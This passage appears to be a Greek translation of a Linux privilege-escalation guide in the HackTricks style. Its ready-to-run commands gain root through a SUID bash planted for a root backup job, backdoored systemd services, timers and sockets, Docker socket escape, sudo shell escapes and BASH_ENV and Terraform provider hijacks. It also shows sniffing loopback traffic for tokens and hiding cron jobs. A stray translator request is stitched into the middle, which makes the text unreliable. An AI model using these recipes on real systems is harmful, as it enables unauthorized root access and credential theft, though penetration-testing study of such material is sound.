**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε διεργασία που ξεκινά).

### Δημιουργίες αντιγράφων ασφαλείας root που διατηρούν τα mode bits που ορίζει ο επιτιθέμενος (pg_basebackup)

Εάν ένα cron που ανήκει σε root τρέχει `pg_basebackup` (ή οποιαδήποτε αναδρομική αντιγραφή) σε έναν κατάλογο βάσης δεδομένων στον οποίο μπορείτε να γράψετε, μπορείτε να τοποθετήσετε ένα **SUID/SGID binary** που θα επανα-αντιγραφεί ως **root:root** με τα ίδια mode bits στο αποτέλεσμα του backup.

Τυπική ροή εντοπισμού (ως χρήστης DB με χαμηλά προνόμια):
- Χρησιμοποιήστε `pspy` για να εντοπίσετε ένα root cron που καλεί κάτι σαν `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` κάθε λεπτό.
- Επιβεβαιώστε ότι το source cluster (π.χ., `/var/lib/postgresql/14/main`) είναι εγγράψιμο από εσάς και ο προορισμός (`/opt/backups/current`) γίνεται ιδιοκτησία του root μετά τη δουλειά.

Εκμετάλλευση:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Αυτό λειτουργεί επειδή `pg_basebackup` διατηρεί τα file mode bits όταν αντιγράφει το cluster· όταν εκτελείται από root, τα αρχεία προορισμού κληρονομούν **root ownership + attacker-chosen SUID/SGID**. Οποιαδήποτε παρόμοια privileged backup/copy routine που κρατάει τα permissions και γράφει σε εκτελέσιμη τοποθεσία είναι ευάλωτη.

### Αόρατα cron jobs

Μπορεί να δημιουργηθεί ένα cronjob **putting a carriage return after a comment** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (note the carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Για να εντοπίσετε αυτό το είδος κρυφής εισόδου, ελέγξτε τα αρχεία cron με εργαλεία που αποκαλύπτουν χαρακτήρες ελέγχου:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε `.service` αρχείο, αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **σταματά** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος).\  
Για παράδειγμα δημιουργήστε το backdoor σας μέσα στο αρχείο `.service` με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα service binaries

Λάβετε υπόψη ότι αν έχετε **write permissions over binaries being executed by services**, μπορείτε να τα αλλάξετε για backdoors ώστε όταν οι services ξαναεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Relative Paths

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, ενδέχεται να μπορείτε να **αυξήσετε τα προνόμια**. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιούργησε ένα **executable** με το **ίδιο όνομα όπως το relative path binary** μέσα στον systemd PATH φάκελο που μπορείς να γράψεις, και όταν η υπηρεσία ζητήσει να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σου θα εκτελεστεί (οι μη-προνομιούχοι χρήστες συνήθως δεν μπορούν να start/stop services αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

**Timers** είναι systemd unit files των οποίων το όνομα τελειώνει σε `**.timer**` και που ελέγχουν `**.service**` αρχεία ή γεγονότα. Οι **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς έχουν ενσωματωμένη υποστήριξη για calendar time events και monotonic time events και μπορούν να εκτελούνται ασύγχρονα.

Μπορείς να απαριθμήσεις όλους τους timers με:
```bash
systemctl list-timers --all
```
### Writable timers

Εάν μπορείτε να τροποποιήσετε ένα timer, μπορείτε να τον αναγκάσετε να εκτελέσει κάποια υπάρχοντα του systemd.unit (όπως `.service` ή `.target`)
```bash
Unit=backdoor.service
```
> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Επομένως, για να καταχραστείτε αυτή την άδεια θα πρέπει να:

- Βρείτε κάποιο systemd unit (π.χ. `.service`) που **εκτελεί ένα writable binary**
- Βρείτε κάποιο systemd unit που **εκτελεί ένα relative path** και έχετε **writable privileges** πάνω στο **systemd PATH** (ώστε να μιμηθείτε αυτό το εκτελέσιμο)

**Μάθετε περισσότερα για τα timers με το `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε ένα timer χρειάζεστε root privileges και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** με τη δημιουργία ενός symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Μάθετε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν, αλλά συνοπτικά χρησιμοποιούνται για να **δείξουν πού θα ακούει** το socket (η διαδρομή του αρχείου AF_UNIX socket, το IPv4/6 και/ή ο αριθμός θύρας που θα ακούει, κ.λπ.)
- `Accept`: Δέχεται ένα boolean όρισμα. Αν είναι **true**, μια **instance της service δημιουργείται για κάθε εισερχόμενη σύνδεση** και μόνο το connection socket περνά σε αυτήν. Αν είναι **false**, όλα τα listening sockets οι ίδιοι **περνάνε στη ξεκινώμενη service unit**, και δημιουργείται μόνο μία service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μια ενιαία service unit χειρίζεται χωρίς εξαιρέσεις όλη την εισερχόμενη κίνηση. **Προεπιλογή: false**. Για λόγους απόδοσης, συνιστάται να γράφονται νέα daemons με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs να **δημιουργηθούν** και να δεσμευτούν, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από τα επιχειρήματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs να **κλείσουν** και να αφαιρεθούν, αντίστοιχα.
- `Service`: Καθορίζει το όνομα της **service** unit που θα **ενεργοποιείται** με την **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προκαθορίζεται στην service που φέρει το ίδιο όνομα με το socket (με την κατάλληλη αντικατάσταση του επίθηματος). Στις περισσότερες περιπτώσεις δεν θα πρέπει να είναι απαραίτητο να χρησιμοποιηθεί αυτή η επιλογή.

### Εγγράψιμα `.socket` αρχεία

Αν βρείτε ένα **εγγράψιμο** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση της μηχανής.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση του socket αρχείου αλλιώς το backdoor δεν θα εκτελεστεί_

### Socket activation + writable unit path (create missing service)

Μια ακόμα υψηλού αντίκτυπου λανθασμένη διαμόρφωση είναι:

- μια socket unit με `Accept=no` και `Service=<name>.service`
- η αναφερόμενη service unit λείπει
- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη unit search path)

Σε αυτή την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service`, και στη συνέχεια να προκαλέσει κίνηση προς το socket ώστε το systemd να φορτώσει και να εκτελέσει τη νέα service ως root.

Γρήγορη ροή:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Εγγράψιμα sockets

Εάν **εντοπίσετε κάποιο εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` files_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Απαρίθμηση Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets listening for HTTP** requests (_δεν εννοώ τα .socket αρχεία αλλά τα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Αν το socket **απαντά με ένα HTTP** request, τότε μπορείτε να **επικοινωνήσετε** με αυτό και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και μέλη της ομάδας `docker`. Η κατοχή πρόσβασης εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Εδώ είναι μια ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να εκτελέσετε ένα container με πρόσβαση επιπέδου root στο σύστημα αρχείων του host.

#### **Χρήση Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα request για να δημιουργήσετε ένα container που mounts τον ριζικό κατάλογο του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε `socat` για να δημιουργήσετε μια σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση root στο σύστημα αρχείων του host.

### Others

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **inside the group `docker`** έχετε [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο σύστημα inter-Process Communication (IPC) που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα με αποδοτικό τρόπο. Σχεδιασμένο για το σύγχρονο σύστημα Linux, παρέχει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διαδικασιών, παραπέμποντας σε ενισχυμένα UNIX domain sockets. Επιπλέον, βοηθά στην εκπομπή γεγονότων ή σημάτων, διευκολύνοντας την ομαλή ενσωμάτωση μεταξύ συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από έναν Bluetooth daemon για εισερχόμενη κλήση μπορεί να οδηγήσει έναν music player να σιωπήσει, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας αιτήματα υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, καθιστώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες πιο απλές.

Το D-Bus λειτουργεί με ένα **allow/deny model**, διαχειριζόμενο δικαιώματα μηνυμάτων (method calls, signal emissions, κ.λπ.) βάσει του αθροιστικού αποτελέσματος ταιριαστών κανόνων πολιτικής. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, ενδεχομένως επιτρέποντας privilege escalation μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει δικαιώματα για τον root χρήστη να είναι owner, να στέλνει και να λαμβάνει μηνύματα από την `fi.w1.wpa_supplicant1`.

Policies χωρίς καθορισμένο χρήστη ή group εφαρμόζονται καθολικά, ενώ οι πολιτικές context "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να enumerate και να exploit μια επικοινωνία D-Bus εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσεις τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Γρήγορη αξιολόγηση φιλτραρίσματος εξερχομένων

Εάν ο host μπορεί να εκτελεί εντολές αλλά τα callbacks αποτυγχάνουν, διαχώρισε γρήγορα το φιλτράρισμα DNS, transport, proxy και route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ανοιχτές θύρες

Ελέγξτε πάντα τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: εκτεθειμένα σε όλες τις τοπικές διεπαφές.
- `127.0.0.1` / `::1`: μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένες εσωτερικές IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσπελάσιμες μόνο από εσωτερικά τμήματα.

### Ροή εργασίας triage για τοπικές υπηρεσίες

Όταν παραβιάσετε έναν host, υπηρεσίες που είναι bound στο `127.0.0.1` συχνά γίνονται προσβάσιμες για πρώτη φορά από το shell σας. Μια γρήγορη τοπική ροή εργασίας είναι:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS ως σαρωτής δικτύου (network-only mode)

Εκτός από τους τοπικούς ελέγχους PE, το linPEAS μπορεί να τρέξει ως στοχευμένος σαρωτής δικτύου. Χρησιμοποιεί διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Εάν δώσετε `-d`, `-p` ή `-i` χωρίς `-t`, το linPEAS συμπεριφέρεται ως pure network scanner (παραλείποντας τα υπόλοιπα privilege-escalation checks).

### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, θα μπορούσατε να καταφέρετε να αποκτήσετε κάποια credentials.
```
timeout 1 tcpdump
```
Γρήγοροι πρακτικοί έλεγχοι:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Το Loopback (`lo`) είναι ιδιαίτερα πολύτιμο στο post-exploitation γιατί πολλές υπηρεσίες που είναι προσβάσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Please paste the contents of src/linux-hardening/privilege-escalation/README.md that you want translated to Greek.
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Χρήστες

### Γενική Απογραφή

Ελέγξτε ποιος/ποια είστε, ποια **προνόμια** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root προνόμια:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει προνόμια root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζεις κάποιον κωδικό** του περιβάλλοντος **προσπάθησε να κάνεις login ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό.

### Su Brute

Αν δεν σου πειράζει να προκαλέσεις πολύ θόρυβο και τα binaries `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείς να προσπαθήσεις να brute-force έναν χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` επίσης προσπαθεί να brute-force χρήστες.

## Καταχρήσεις Writable PATH

### $PATH

Αν βρεις ότι μπορείς να **γράψεις μέσα σε κάποιον φάκελο του $PATH** ίσως μπορέσεις να αποκτήσεις αυξημένα προνόμια δημιουργώντας ένα backdoor μέσα στο φάκελο με δυνατότητα εγγραφής με το όνομα κάποιας εντολής που θα εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον γράψιμο φάκελό σου στο $PATH.

### SUDO and SUID

Μπορεί να σου επιτρέπεται να εκτελέσεις κάποια εντολή χρησιμοποιώντας sudo ή οι εντολές να έχουν το suid bit. Έλεγξέ το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απρόσμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η διαμόρφωση του sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει μια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να τρέξει το `vim` ως `root`. Είναι πλέον απλό να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον root κατάλογο ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **set an environment variable** ενώ εκτελεί κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **vulnerable** σε **PYTHONPATH hijacking** ώστε να φορτώσει μια αυθαίρετη python βιβλιοθήκη ενώ εκτελούσε το script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

Αν οι sudoers διατηρούν το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να εκμεταλλευτείτε τη μη-διαδραστική συμπεριφορά εκκίνησης του Bash για να εκτελέσετε αυθαίρετο κώδικα ως root κατά την κλήση μιας επιτρεπόμενης εντολής.

- Γιατί λειτουργεί: Σε μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source το αρχείο αυτό πριν τρέξει το στοχευόμενο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Αν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με δικαιώματα root.

- Απαιτήσεις:
- Ένας κανόνας sudo που μπορείτε να τρέξετε (οποιοδήποτε target που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληράνση:
- Αφαιρέστε `BASH_ENV` (και `ENV`) από το `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται από sudo· χρησιμοποιήστε minimal binaries.
- Εξετάστε sudo I/O logging και ειδοποίηση όταν χρησιμοποιούνται preserved env vars.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Εάν το sudo αφήνει το περιβάλλον ανέπαφο (`!env_reset`) ενώ επιτρέπει το `terraform apply`, το `$HOME` παραμένει του χρήστη που καλεί. Συνεπώς, το Terraform φορτώνει ως root το **$HOME/.terraformrc** και τηρεί το `provider_installation.dev_overrides`.

- Στοχεύστε τον απαιτούμενο provider σε έναν εγγράψιμο κατάλογο και τοποθετήστε ένα κακόβουλο plugin με το όνομα του provider (π.χ. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
